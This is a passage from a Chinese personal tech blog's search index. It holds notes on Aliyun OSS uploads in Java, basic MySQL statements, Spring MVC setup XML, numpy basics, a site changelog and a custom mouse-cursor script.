class="keyword">static</span> String ENDPOINT;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String KEY_ID;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String KEY_SECRET;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String BUCKET_NAME;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ENDPOINT = endpoint;</span><br><span class="line">        KEY_ID = keyid;</span><br><span class="line">        KEY_SECRET = keysecret;</span><br><span class="line">        BUCKET_NAME = bucketname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="具体执行代码"><a href="#具体执行代码" class="headerlink" title="具体执行代码"></a>具体执行代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">uploadFile</span><span class="params">(MultipartFile file)</span> &#123;</span><br><span class="line">     <span class="comment">// 获取oss参数</span></span><br><span class="line">     <span class="type">String</span> <span class="variable">endpoint</span> <span class="operator">=</span> OssUtils.ENDPOINT;</span><br><span class="line">     <span class="type">String</span> <span class="variable">keyId</span> <span class="operator">=</span> OssUtils.KEY_ID;</span><br><span class="line">     <span class="type">String</span> <span class="variable">keySecret</span> <span class="operator">=</span> OssUtils.KEY_SECRET;</span><br><span class="line">     <span class="type">String</span> <span class="variable">bucketName</span> <span class="operator">=</span> OssUtils.BUCKET_NAME;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="type">OSS</span> <span class="variable">ossClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OSSClientBuilder</span>().build(endpoint, keyId, keySecret);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 文件上传工作流</span></span><br><span class="line">         <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> file.getInputStream();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 获取文件名称</span></span><br><span class="line">         <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         <span class="comment">// **若文件名重复，新的会自动覆盖旧的文件，所以需要对文件进行区分</span></span><br><span class="line">         <span class="comment">// 此处我用的是时间日期分类</span></span><br><span class="line">         <span class="type">String</span> <span class="variable">datePath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DateTime</span>().toString(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line">         <span class="comment">// 拼接</span></span><br><span class="line">         filename = datePath + filename;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 调用oss方法实现上传</span></span><br><span class="line">         <span class="comment">// 参数1：Bucket名称</span></span><br><span class="line">         <span class="comment">// 参数2：上传到oss的文件路径和文件名</span></span><br><span class="line">         <span class="comment">// 参数3： 上传文件输入流</span></span><br><span class="line">         ossClient.putObject(bucketName,filename,inputStream);</span><br><span class="line">         <span class="comment">// 关闭流</span></span><br><span class="line">         ossClient.shutdown();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 上传完文件后将文件路径返回</span></span><br><span class="line">         <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;https://&quot;</span> + bucketName + <span class="string">&quot;.&quot;</span> + endpoint + <span class="string">&quot;/&quot;</span> + filename;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">return</span> url;</span><br><span class="line">     &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用sql语句</title>
      <link href="/2022/12/05/%E5%B8%B8%E7%94%A8sql/"/>
      <url>/2022/12/05/%E5%B8%B8%E7%94%A8sql/</url>
      
        <content type="html"><![CDATA[<h5 id="展示所有数据库"><a href="#展示所有数据库" class="headerlink" title="展示所有数据库"></a>展示所有数据库</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases</span><br></pre></td></tr></table></figure><h5 id="创建一个student-grade表"><a href="#创建一个student-grade表" class="headerlink" title="创建一个student_grade表"></a>创建一个student_grade表</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student_grade(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">VARCHAR</span>(<span class="number">20</span>),</span><br><span class="line">enligsh <span class="type">DECIMAL</span>(<span class="number">3</span>,<span class="number">1</span>),</span><br><span class="line">math <span class="type">DECIMAL</span>(<span class="number">3</span>,<span class="number">1</span>),</span><br><span class="line">chinese <span class="type">DECIMAL</span>(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><em>此处enligsh为故意写错，方便下面修改示范</em></p><h5 id="插入两个数据"><a href="#插入两个数据" class="headerlink" title="插入两个数据"></a>插入两个数据</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student_grade ( id, NAME, enligsh, math, chinese )</span><br><span class="line"><span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>,<span class="string">&#x27;李狗蛋&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>),</span><br><span class="line">(<span class="number">2</span>,<span class="string">&#x27;聪明的李某人&#x27;</span>,<span class="number">99</span>,<span class="number">99</span>,<span class="number">99</span>);</span><br></pre></td></tr></table></figure><h5 id="查看表结构"><a href="#查看表结构" class="headerlink" title="查看表结构"></a>查看表结构</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">desc</span> student_grade</span><br></pre></td></tr></table></figure><p>此时发现enligsh拼写错误</p><h5 id="修改字段名"><a href="#修改字段名" class="headerlink" title="修改字段名"></a>修改字段名</h5><p>参考例句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 CHANGE 旧字段名 新字段名 新数据类型;</span><br></pre></td></tr></table></figure><p>此处所用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student_grade CHANGE enligsh  english <span class="type">DECIMAL</span>(<span class="number">3</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>这个方法也可以用来修改指定字段的数据类型，<strong><em>但是修改字段类型需要保证改后的数据类型能兼容之前的数据</em></strong>，例如此处我修改name的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student_grade CHANGE name name <span class="type">VARCHAR</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssm构建笔记</title>
      <link href="/2022/12/04/ssm%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/12/04/ssm%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ssm笔记"><a href="#ssm笔记" class="headerlink" title="ssm笔记"></a>ssm笔记</h1><h3 id="原始版构建方式"><a href="#原始版构建方式" class="headerlink" title="原始版构建方式"></a>原始版构建方式</h3><ol><li><p>alt+insert添加依赖，引入spring-webmvc依赖</p></li><li><p>open moudle setting 配置web中的web Resource Directories路径和Deployment Descriptos路径</p></li><li><p>创建任意controller</p></li><li><p>于resources文件夹中创建applicationContext.xml和spring-servlet.xml</p></li><li><p>applicationContext.xml配置，先配置需要扫描的包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/c&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- base-package 表示要扫描的包；use-default-filters表示使用默认的过滤器，true表示全扫--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;org.ll&quot;</span> <span class="attr">use-default-filters</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--除去controller，其他的都扫--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">experssion</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--下面可配mybatis--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>spring-servlet.xml的配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/c&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--不使用默认的过滤器，需要指定扫描的包--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;org.ll&quot;</span> <span class="attr">user-default-filters</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--包括哪个，即指定哪个包--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--视图解析器等在下面配--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>web.xml文件配置</p></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--加载spring的配置文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--spring mvc的配置文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>numpy数据分析</title>
      <link href="/2022/12/04/numpy%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"/>
      <url>/2022/12/04/numpy%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="我的博客部署成功了"><a href="#我的博客部署成功了" class="headerlink" title="我的博客部署成功了"></a>我的博客部署成功了</h2><h1 id="numpy数据分析"><a href="#numpy数据分析" class="headerlink" title="numpy数据分析**"></a>numpy数据分析**</h1><h2 id="numpy模块"><a href="#numpy模块" class="headerlink" title="numpy模块"></a>numpy模块</h2><h3 id="数组存在优先级："><a href="#数组存在优先级：" class="headerlink" title="数组存在优先级："></a>数组存在优先级：</h3><ol><li>字符串&gt;浮点型&gt;整数</li></ol><h3 id="数组常用方法："><a href="#数组常用方法：" class="headerlink" title="数组常用方法："></a>数组常用方法：</h3><ol><li><p>zero()</p></li><li><p>ones()</p></li><li><p>linspace()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.linspace(<span class="number">0</span>,<span class="number">100</span>,num=<span class="number">20</span>)  <span class="comment"># 返回从0大100的20个数的一维等差数列对应的数组</span></span><br></pre></td></tr></table></figure><p>​</p></li><li><p>arange()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.arange(<span class="number">10</span>,<span class="number">50</span>,step=<span class="number">2</span>)  <span class="comment"># 返回从10到50（不包括50）,步数为2的等差数列对应的一维数组</span></span><br></pre></td></tr></table></figure><p>​</p></li><li><p>random系列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.random.randint(<span class="number">0</span>,<span class="number">100</span>,size=(<span class="number">5</span>,<span class="number">3</span>)) <span class="comment"># 返回0到100间的五行三列的二维随机数</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="numpy常用属性"><a href="#numpy常用属性" class="headerlink" title="numpy常用属性"></a>numpy常用属性</h3><ol><li><p>shape   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.shape  <span class="comment"># 数组的形状，几行几列</span></span><br></pre></td></tr></table></figure></li><li><p>ndim</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.ndim  <span class="comment"># 返回的是数组的维度</span></span><br></pre></td></tr></table></figure></li><li><p>size</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.size  <span class="comment"># 返回数组元素的个数</span></span><br></pre></td></tr></table></figure></li><li><p>dtype</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.dtype <span class="comment"># 返回是数组元素类型题</span></span><br></pre></td></tr></table></figure></li></ol><p>创建数组并制定元素类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],dtype=<span class="string">&#x27;int64&#x27;</span>)</span><br></pre></td></tr></table></figure><p>修改数组元素类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.dtype = <span class="string">&#x27;uint8&#x27;</span> <span class="comment"># 修改数组的元素类型</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>更新日志</title>
      <link href="/2022/12/01/%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/"/>
      <url>/2022/12/01/%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<h3 id="2022-12-1更新内容"><a href="#2022-12-1更新内容" class="headerlink" title="2022-12-1更新内容"></a>2022-12-1更新内容</h3><p>1.修改博客音乐播放器，原网易云，现QQ音乐<br>2.因为收到大量广告评论，现关闭评论功能<br>3.更改网页图标<br>4.更改图片显示方式，增快读取速度。（但是因为使用vercel部署的原因，国内访问还是较慢，但是能接受，以后再想办法）</p><h3 id="2022-12-1更新内容-1"><a href="#2022-12-1更新内容-1" class="headerlink" title="2022-12-1更新内容"></a>2022-12-1更新内容</h3><p>1.修改标签和分类<br>2.修补部分显示错误</p><h3 id="2023-1-12更新内容"><a href="#2023-1-12更新内容" class="headerlink" title="2023-1-12更新内容"></a>2023-1-12更新内容</h3><p>1.下线音乐播放器</p><h3 id="2023-1-12更新内容-1"><a href="#2023-1-12更新内容-1" class="headerlink" title="2023-1-12更新内容"></a>2023-1-12更新内容</h3><p>1.重新上线音乐播放器<br>2.首页底部增加音乐播放器<br>3.新增挂件<br>4.暂时下线github贡献图<br>5.修改dns，加速访问速度<br>6.白天模式和夜间模式切换时壁纸改变</p><h3 id="2023-4-24更新内容"><a href="#2023-4-24更新内容" class="headerlink" title="2023-4-24更新内容"></a>2023-4-24更新内容</h3><p>1.部分网页增加访问密码</p><h3 id="2023-4-25更新内容"><a href="#2023-4-25更新内容" class="headerlink" title="2023-4-25更新内容"></a>2023-4-25更新内容</h3><p>1.新增评论功能</p><h3 id="2023-5-16更新内容"><a href="#2023-5-16更新内容" class="headerlink" title="2023-5-16更新内容"></a>2023-5-16更新内容</h3><p>1.新增两个分类，目前分类比较复杂，后期还会做调整<br>2.新增gitee联系方式</p>]]></content>
      
      
      <categories>
          
          <category> 公告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试文章</title>
      <link href="/2022/11/28/next1/"/>
      <url>/2022/11/28/next1/</url>
      
        <content type="html"><![CDATA[<h2 id="这是一个测试文章"><a href="#这是一个测试文章" class="headerlink" title="这是一个测试文章"></a>这是一个测试文章</h2><p>以下为文章格式测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>欢迎来到我的博客</title>
      <link href="/2022/11/26/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
      <url>/2022/11/26/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<!-- # 本地图片 --><!-- <img src="/assets/pusheencode.webp" alt="示例图片" style="zoom:50%;" /> --><h1 id="一起变强吧🚅"><a href="#一起变强吧🚅" class="headerlink" title="一起变强吧🚅"></a>一起变强吧🚅</h1><p><img src="https://w.wallhaven.cc/full/ex/wallhaven-exyp3k.jpg" alt="code"></p>]]></content>
      
      
      <categories>
          
          <category> 公告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>归档</title>
      <link href="/archives/index.html"/>
      <url>/archives/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<!-- GitCalendar容器 --><h2 id="暂时下线"><a href="#暂时下线" class="headerlink" title="暂时下线"></a>暂时下线</h2><!-- ## github贡献图 --><!-- <div id="gitHub"></div> -->]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/cursor.js"/>
      <url>/js/cursor.js</url>
      
        <content type="html"><![CDATA[var CURSOR;Math.lerp = (a, b, n) => (1 - n) * a + n * b;const getStyle = (el, attr) => {    try {        return window.getComputedStyle            ? window.getComputedStyle(el)[attr]            : el.currentStyle[attr];    } catch (e) {}    return "";};class Cursor {    constructor() {        this.pos = {curr: null, prev: null};        this.pt = [];        this.create();        this.init();        this.render();    }    move(left, top) {        this.cursor.style["left"] = `${left}px`;        this.cursor.style["top"] = `${top}px`;    }    create() {        if (!this.cursor) {            this.cursor = document.createElement("div");            this.cursor.id = "cursor";            this.cursor.classList.add("hidden");            document.body.append(this.cursor);        }        var el = document.getElementsByTagName('*');        for (let i = 0; i < el.length; i++)            if (getStyle(el[i], "cursor") == "pointer")                this.pt.push(el[i].outerHTML);        document.body.appendChild((this.scr = document.createElement("style")));        // 这里改变鼠标指针的颜色 由svg生成        this.scr.innerHTML = `* {cursor: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8' width='8px' height='8px'><circle cx='4' cy='4' r='4' opacity='1.0' fill='rgb(66, 166, 224)'/></svg>") 4 4, auto}`;    }    refresh() {        this.scr.remove();        this.cursor.classList.remove("hover");        this.cursor.classList.remove("active");        this.pos = {curr: null, prev: null};        this.pt = [];        this.create();        this.init();        this.render();    }    init() {        document.onmouseover  = e => this.pt.includes(e.target.outerHTML) && this.cursor.classList.add("hover");        document.onmouseout   = e => this.pt.includes(e.target.outerHTML) && this.cursor.classList.remove("hover");        document.onmousemove  = e => {(this.pos.curr == null) && this.move(e.clientX - 8, e.clientY - 8); this.pos.curr = {x: e.clientX - 8, y: e.clientY - 8}; this.cursor.classList.remove("hidden");};        document.onmouseenter = e => this.cursor.classList.remove("hidden");        document.onmouseleave = e => this.cursor.classList.add("hidden");        document.onmousedown  = e => this.cursor.classList.add("active");        document.onmouseup    = e => this.cursor.classList.remove("active");    }    render() {        if (this.pos.prev) {            this.pos.prev.x = Math.lerp(this.pos.prev.x, this.pos.curr.x, 0.15);            this.pos.prev.y = Math.lerp(this.pos.prev.y, this.pos.curr.y, 0.15);            this.move(this.pos.prev.x, this.pos.prev.y);        } else {            this.pos.prev = this.pos.curr;        }        requestAnimationFrame(() => this.render());    }}(() => {    CURSOR = new Cursor();    // 需要重新获取列表时，使用 CURSOR.refresh()})();]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/day.js"/>
      <url>/js/day.js</url>
      
